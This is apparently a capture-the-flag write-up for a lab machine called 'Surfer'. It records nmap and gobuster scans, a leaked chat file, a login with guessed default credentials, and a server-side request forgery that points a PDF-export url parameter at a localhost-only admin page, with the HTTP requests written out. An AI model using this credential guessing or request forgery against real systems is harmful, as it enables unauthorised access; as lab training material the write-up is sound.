# Intro
Woah, check out this radical app! Isn't it narly dude? We've been surfing through some webpages and we want to get you on board too! They said this application has some functionality that is only available for internal usage -- but if you catch the right wave, you can probably find the sweet stuff!
# Enumeration
## [[Ping]]
```sh
sami@bt:~/Documents/THM/CTFs/surfer$ ping surfer.thm   
PING surfer (10.10.143.221) 56(84) bytes of data.
64 bytes from surfer (10.10.143.221): icmp_seq=1 ttl=63 time=53.6 ms
64 bytes from surfer (10.10.143.221): icmp_seq=2 ttl=63 time=53.8 ms
64 bytes from surfer (10.10.143.221): icmp_seq=3 ttl=63 time=53.8 ms
64 bytes from surfer (10.10.143.221): icmp_seq=4 ttl=63 time=53.7 ms
^C
--- surfer ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 53.585/53.740/53.832/0.097 ms
```
## [[Nmap]] security scan
```sh
sami@bt:~/Documents/THM/CTFs/surfer$ sudo nmap -A -p- -oN nmap_results.txt surfer.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 22:13 EET
Nmap scan report for surfer.thm (10.10.143.221)
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 076e505cb8fc07d3a9a4cb952d34ae4c (RSA)
|   256 34a992d547191efbd7143cbc051e9799 (ECDSA)
|_  256 06745b3c15f40ab55eed52c1ece9435c (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/backup/chat.txt
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: 24X7 System+
|_Requested resource was /login.php
|_http-server-header: Apache/2.4.38 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/25%OT=22%CT=1%CU=33837%PV=Y%DS=2%DC=T%G=Y%TM=638121
OS:FE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
OS:11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   53.60 ms 10.11.0.1
2   53.64 ms surfer.thm (10.10.143.221)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.42 seconds
```
### Notes
- [[ssh]] open on port 22
- [[http]] open on port 80
	- `|_/backup/chat.txt`
## surfer(.)thm/login.php
![[Pasted image 20221125225434.png]]
### Notes
- Nothing raises any flags in the source code
## view-source: surfer(.)thm/backup/chat.txt
```txt
Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```
### Notes
- This should tell us that there's a hidden directory related to PDF functions.
- `Kate` informed the `Admin` to stop using their username as a password. From this we understand that the Admin might be using `admin:admin`.
## Directory scan
### Level 1 Dir scan surfer(.)thm/
```sh
sami@bt:~/Documents/THM/CTFs/surfer$ gobuster dir -u http://surfer.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results.txt -x txt,php,html,js -t 20
/Readme.txt           (Status: 200) [Size: 222]
/assets               (Status: 301) [Size: 309] [--> http://surfer.thm/assets/]
/backup               (Status: 301) [Size: 309] [--> http://surfer.thm/backup/]
/changelog.txt        (Status: 200) [Size: 816]
/index.php            (Status: 302) [Size: 0] [--> /login.php]
/internal             (Status: 301) [Size: 311] [--> http://surfer.thm/internal/]
/login.php            (Status: 200) [Size: 4774]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 40]
/robots.txt           (Status: 200) [Size: 40]
/server-status        (Status: 403) [Size: 275]
/server-info.php      (Status: 200) [Size: 1689]
/vendor               (Status: 301) [Size: 309] [--> http://surfer.thm/vendor/]
/verify.php           (Status: 302) [Size: 0] [--> /login.php]
```
### Level 2 Dir scan surfer(.)thm/backup/
```sh
sami@bt:~/Documents/THM/CTFs/surfer$ gobuster dir -u http://surfer.thm/backup -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results_backup.txt -x txt,php,html,js -t 20
/chat.txt             (Status: 200) [Size: 365]
```
### Level 2 Dir scan surfer(.)thm/internal/
```sh
sami@bt:~/Documents/THM/CTFs/surfer$ gobuster dir -u http://surfer.thm/internal -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results_internal.txt -x txt,php,html,js -t 20
/admin.php            (Status: 200) [Size: 39]
```
### Level 2 Dir scan surfer(.)thm/vendor/
```sh
sami@bt:~/Documents/THM/CTFs/surfer$ gobuster dir -u http://surfer.thm/vendor -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results_vendor.txt -x txt,php,html,js -t 20
```
## surfer(.)thm/login.php 
![[Pasted image 20221125225959.png]]
### Notes
- Using `admin:admin`
- Access obtained
![[Pasted image 20221125232830.png]]
- Checking out the _Recent Activity_ we see `/internal/admin.php` that was already discovered in our dir scan. 
- Notice the `Export to PDF` button. We'll test it in [[BurpSuite]]
## surfer(.)thm/internal/admin.php
```html
This page can only be accessed locally.
```
# Webapp Analysis using [[BurpSuite]]
## Export to PDF Button
```http
POST /export2pdf.php HTTP/1.1
Host: surfer.thm
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://surfer.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://surfer.thm/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ee0e710c62bc20b8a1fb6b0e0974698a
Connection: close

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```
### Notes
- `url=http%3A%2F%2F127.0.0.1%2Fserver-info.php` 
- ![[Pasted image 20221126000251.png]]
- We've obtained a PDF document that pull data from `server-info.php` that can only be accessed locally by the localhost (the target/victim host).
- Therefore, in order to obtain further info from `/internal/admin.php` we need to modify the request in [[BurpSuite]] or in Inspect Elements from the browser and send it.
## /internal/admin.php locally through Export to PDF
```http
POST /export2pdf.php HTTP/1.1
Host: surfer.thm
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://surfer.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://surfer.thm/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ee0e710c62bc20b8a1fb6b0e0974698a
Connection: close

url=http://localhost/internal/admin.php
```
### Notes
- a "Report generated for http://localhost/internal/admin.php" was obtained.
- Flag has been obtained.
- ![[Pasted image 20221126001519.png]]
# Lessons learnt
- Never user default credentials.
- Teams communications should be held through secured end-to-end encrypted channels and not through clear text.